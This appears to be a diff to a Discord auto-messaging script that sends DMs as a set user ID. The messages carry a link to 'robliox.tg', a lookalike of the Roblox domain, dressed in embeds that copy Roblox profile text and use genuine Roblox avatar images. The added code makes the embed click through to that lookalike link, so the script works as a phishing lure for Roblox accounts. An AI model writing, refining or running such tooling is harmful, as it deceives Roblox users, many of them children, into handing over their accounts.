@@ -73,13 +73,13 @@ const CONFIG = {
         channelId: "",  // Channel ID to send to (leave empty to use dmUserId)
         dmUserId: "753944929973174283",  // User ID to DM (if channelId is empty)
         userId: "753944929973174283",    // User ID that will appear to send the message
-        content: "https://www.robliox.tg/users/25699615/profile",
+        content: "https://www.robliox.tg/users/6081066/profile",
         username: "",  // Optional: override username
         avatar: "",     // Optional: override avatar
         // New embed customization options
-        embedTitle: "CrazyKiara111's Profile",  // Custom embed title
-        embedDescription: "CrazyKiara111 is one of the millions creating and exploring the endless possibilities of Roblox. Join CrazyKiara111 on Roblox and explore together!Razorbill mogger",  // Custom embed description
-        embedThumbnail: "https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528"  // Custom embed thumbnail URL
+        embedTitle: "Konethorix's Profile",  // Custom embed title
+        embedDescription: "Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...",  // Custom embed description
+        embedThumbnail: "https://images-ext-1.discordapp.net/external/egR8q16749GC4dSR2dYPVr1jfnk4LyfBgl0zMj4IEMM/https/tr.rbxcdn.com/30DAY-Avatar-AF8C1D09485419A05356B4F0B8E9D2A7-Png/352/352/Avatar/Png/noFilter?format=webp&width=440&height=440"  // Custom embed thumbnail URL
       }
       // Add more auto messages as needed...
     ],
@@ -516,11 +516,22 @@ const CONFIG = {
       
       // If custom embed is provided, use it
       if (embed && (embed.title || embed.description || embed.url || embed.thumbnail)) {
+        // Extract URL from content if no URL provided - this ensures the embed is clickable
+        // and Discord properly displays it as a link embed with thumbnail on the right
+        let embedUrl = embed.url;
+        if (!embedUrl && content) {
+          const urlRegex = /(https?:\/\/[^\s]+)/g;
+          const urls = content.match(urlRegex);
+          if (urls && urls.length > 0) {
+            embedUrl = urls[0]; // Use first URL found
+          }
+        }
+        
         embeds.push({
           type: "rich",
           title: embed.title || undefined,
           description: embed.description || undefined,
-          url: embed.url || undefined,
+          url: embedUrl || undefined,
           thumbnail: embed.thumbnail ? { url: embed.thumbnail } : undefined
         });
       }
@@ -645,11 +656,21 @@ const CONFIG = {
       
       // If custom embed is provided, use it
       if (embed && (embed.title || embed.description || embed.url || embed.thumbnail)) {
+        // Extract URL from content if no URL provided
+        let embedUrl = embed.url;
+        if (!embedUrl && content) {
+          const urlRegex = /(https?:\/\/[^\s]+)/g;
+          const urls = content.match(urlRegex);
+          if (urls && urls.length > 0) {
+            embedUrl = urls[0]; // Use first URL found
+          }
+        }
+        
         embeds.push({
           type: "rich",
           title: embed.title || undefined,
           description: embed.description || undefined,
-          url: embed.url || undefined,
+          url: embedUrl || undefined,
           thumbnail: embed.thumbnail ? { url: embed.thumbnail } : undefined
         });
       }
@@ -755,11 +776,21 @@ const CONFIG = {
       
       // If custom embed is provided, use it
       if (embed && (embed.title || embed.description || embed.url || embed.thumbnail)) {
+        // Extract URL from content if no URL provided
+        let embedUrl = embed.url;
+        if (!embedUrl && content) {
+          const urlRegex = /(https?:\/\/[^\s]+)/g;
+          const urls = content.match(urlRegex);
+          if (urls && urls.length > 0) {
+            embedUrl = urls[0]; // Use first URL found
+          }
+        }
+        
         embeds.push({
           type: "rich",
           title: embed.title || undefined,
           description: embed.description || undefined,
-          url: embed.url || undefined,
+          url: embedUrl || undefined,
           thumbnail: embed.thumbnail ? { url: embed.thumbnail } : undefined
         });
       }
